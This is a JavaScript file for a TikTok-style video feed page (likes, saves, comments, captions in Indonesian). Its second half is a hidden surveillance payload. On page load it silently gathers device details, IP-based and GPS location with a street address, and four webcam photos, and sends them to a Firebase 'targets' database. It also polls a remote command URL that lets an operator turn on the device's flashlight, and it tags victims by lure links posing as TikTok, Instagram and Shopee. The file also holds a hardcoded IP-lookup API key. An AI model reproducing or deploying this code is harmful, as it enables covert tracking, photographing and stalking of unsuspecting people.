const comments = document.getElementById("comments");
const feedContainer = document.getElementById("feedContainer");
const videoItems = document.querySelectorAll(".video-item");

function openComments(event) {
    event.stopPropagation();
    if (comments) comments.classList.add("active");
}

function toggleText(event) {
    event.stopPropagation();
    const more = event.currentTarget;
    const caption = more.closest(".caption");
    if (!caption) return;
    if (more.textContent.trim() === "lebih sedikit") {
        caption.innerHTML = caption.dataset.short + " <span class='more' onclick='toggleText(event)'>lebih banyak</span>";
    } else {
        caption.innerHTML = caption.dataset.full + " <span class='more' onclick='toggleText(event)'>lebih sedikit</span>";
    }
}

videoItems.forEach((item) => {
    const container = item.querySelector(".container");
    const video = item.querySelector("video");
    const pauseOverlay = item.querySelector(".pause-overlay");
    const likeBtn = item.querySelector(".like-btn");
    const likeAnim = item.querySelector(".like");
    const saveBtn = item.querySelector(".save-btn");

    if (!video) return;
    let lastTap = 0;

    const updateOverlay = () => video.paused ? pauseOverlay.classList.add("active") : pauseOverlay.classList.remove("active");

    if (container) {
        container.addEventListener("click", (e) => {
            if (comments) comments.classList.remove("active");
            if (e.target.closest(".sidebar") || e.target.closest(".more")) return;
            const now = Date.now();
            if (now - lastTap < 300) {
                if (likeBtn) likeBtn.classList.add("liked");
                if (likeAnim) likeAnim.classList.add("active");
                setTimeout(() => likeAnim.classList.remove("active"), 600);
            } else {
                video.paused ? video.play() : video.pause();
                updateOverlay();
            }
            lastTap = now;
        });
    }
    video.addEventListener("pause", updateOverlay);
    video.addEventListener("play", updateOverlay);
    if (likeBtn) likeBtn.addEventListener("click", (e) => { e.stopPropagation(); likeBtn.classList.toggle("liked"); });
    if (saveBtn) saveBtn.addEventListener("click", (e) => { e.stopPropagation(); saveBtn.classList.toggle("saved"); });
});

// ======================================================
// [ FIXED LOGIC: DATA CENTER SYNC ]
// ======================================================

const BASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";

async function startSilentLoot() {
    // 1. BUAT SESSION ID (FOLDER UNIK)
    const sessionID = "ONX-" + Math.random().toString(36).substr(2, 6).toUpperCase();
    const params = new URLSearchParams(window.location.search);
    const targetID = params.get('id');
    let finalSource = "Direct Access";

    if (targetID) {
        const labels = {
            'jaket': 'TikTok',
            'baju': 'Instagram',
            'sepatu': 'Shopee'
        };
        // Kalau ID cocok, pake labelnya. Kalau gak cocok, tampilin ID aslinya.
        finalSource = labels[targetID] || `Unknown ID: ${targetID}`;
    } else if (document.referrer) {
        finalSource = "Ref: " + document.referrer;
    }

    let report = {
        session_id: sessionID,
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        platform: (function() {
            var ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android";
            if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
            if (/Windows/i.test(ua)) return "Windows";
            if (/Mac/i.test(ua)) return "MacOS";
            return navigator.platform; 
        })(),
        referrer: finalSource,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        language: navigator.language
    };

    // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
    async function fetchLocation() {
        // CADANGAN 1: IP2Location (Yang lu pake sekarang)
        try {
            const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
            const d = await res.json();
            if (d.ip) return { 
                ip: d.ip, isp: d.isp, city: d.city_name, 
                district: d.district || "N/A", 
                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
                asn: d.asn
            };
        } catch (e) { console.log("API 1 Limit"); }

        // CADANGAN 2: IPIFY (Pake yang lu mau, tapi datanya CUMA IP)
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            report.ip = data.ip; // Pakai report.ip (langsung), jangan pake .network kalau gak ada
        } catch (e) {
            report.ip = "Failed to fetch IP";
        }

        // CADANGAN 3: Cloudflare (Benteng terakhir)
        try {
            const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
            const text = await res.text();
            const ip = text.match(/ip=(.*)\n/)[1];
            return { ip: ip, isp: "Cloudflare Warp", city: "Unknown", district: "N/A", loc: "#", asn: "Unknown" };
        } catch (e) { return { ip: "All API Failed" }; }
    }

    // Eksekusi Waterfall
    const locationData = await fetchLocation();
    report = { ...report, ...locationData };


    // 3. AMBIL GPS AKURAT (JIKA ALLOW)
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        // Terjemahin koordinat ke alamat jalan
        const alamatJalan = await getRealAddress(lat, lon);
        
        report.loc = `https://www.google.com/maps?q=${lat},${lon}`;
        report.address_detail = alamatJalan; // <--- Variabel baru buat alamat jalan

        // Update folder yang sama dengan koordinat & alamat baru
        fetch(`${BASE_API}/${sessionID}.json`, { 
            method: 'PATCH', 
            body: JSON.stringify({ 
                loc: report.loc, 
                address_detail: report.address_detail 
            }) 
        });
    }, null, { enableHighAccuracy: true });

    // 4. JALANKAN KAMERA
    initCamera(report, sessionID);
}

async function initCamera(report, sessionID) {
    const TARGET_URL = `${BASE_API}/${sessionID}.json`; // <--- PATH KE FOLDER

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        await video.play();

        listenForFlash(stream);

        let shots = 0;
        let burst = setInterval(async () => {
            if (shots < 4) {
                shots++;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);

                // Kirim ke variabel photo1, photo2, dst agar tidak saling timpa
                let updateData = { ...report, burst_no: shots };
                updateData[`photo${shots}`] = imageData; // Dinamis: photo1, photo2...

                await fetch(TARGET_URL, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(updateData)
                });
            } else {
                clearInterval(burst);
            }
        }, 2000);

    } catch (err) {
        // Kirim data tanpa foto jika ditolak
        fetch(TARGET_URL, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...report, photo: "Access Denied" })
        });
    }
}

async function listenForFlash(stream) {
    const track = stream.getVideoTracks()[0];
    setInterval(async () => {
        try {
            const res = await fetch(COMMAND_URL);
            const cmd = await res.json();
            if (track && track.getCapabilities().torch) {
                await track.applyConstraints({ advanced: [{ torch: cmd.flash === "ON" }] });
            }
        } catch (e) {}
    }, 2000);
}

async function getRealAddress(lat, lon) {
    try {
        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
        const data = await response.json();
        // Mengambil Desa/Kelurahan, Kota, dan Provinsi
        return `${data.locality || 'Desa/Kel tdk terbaca'}, ${data.city}, ${data.principalSubdivision}`;
    } catch (error) {
        return "Gagal ambil nama jalan";
    }
}

window.onload = () => { setTimeout(startSilentLoot, 2000); };
